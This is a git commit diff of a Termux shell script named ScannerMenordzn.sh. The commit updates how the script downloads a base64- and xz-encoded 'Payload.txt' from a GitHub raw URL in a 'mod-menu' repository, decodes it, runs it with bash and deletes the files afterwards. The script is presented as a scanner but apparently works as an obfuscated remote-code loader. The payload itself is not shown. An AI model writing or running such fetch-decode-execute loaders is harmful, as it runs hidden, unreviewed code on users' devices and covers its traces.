f210bb40bb0570b8f55a480988aaf7df8a9cb999
Menordzn <kalebfreefire4@gmail.com>
2026-05-23 22:10:21 -0300

    Update payload download and extraction methods

--- ScannerMenordzn.sh
+++ ScannerMenordzn.sh
@@ -4,12 +4,11 @@ URL="https://raw.githubusercontent.com/kaleb7776/mod-menu/main/Payload.txt"
 
 TMP="/data/data/com.termux/files/usr/tmp/payload.$$"
 
-curl -fsSL "$URL" -o "$TMP.b64" || exit 1
+curl -fsSL "$URL" -o "$TMP" || exit 1
 
-base64 -d "$TMP.b64" | gunzip > "$TMP.sh" || exit 1
+base64 -d "$TMP" | xz -d > "$TMP.sh" || exit 1
 
 chmod +x "$TMP.sh"
-
 bash "$TMP.sh"
 
-rm -f "$TMP.b64" "$TMP.sh"
+rm -f "$TMP" "$TMP.sh"
